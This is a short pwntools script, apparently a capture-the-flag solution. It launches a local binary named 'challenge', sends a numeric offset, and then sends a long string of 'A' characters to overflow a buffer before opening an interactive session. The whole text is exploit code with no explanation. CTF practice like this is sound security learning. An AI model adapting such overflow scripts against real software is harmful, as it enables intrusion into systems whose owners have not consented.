from pwn import *
exe = context.binary = ELF("./challenge")
r = process()
offset = 135144
r.sendline(str(offset))
offset += 25
print(r.recv(9999))
r.sendline(b"A" * offset)
r.interactive()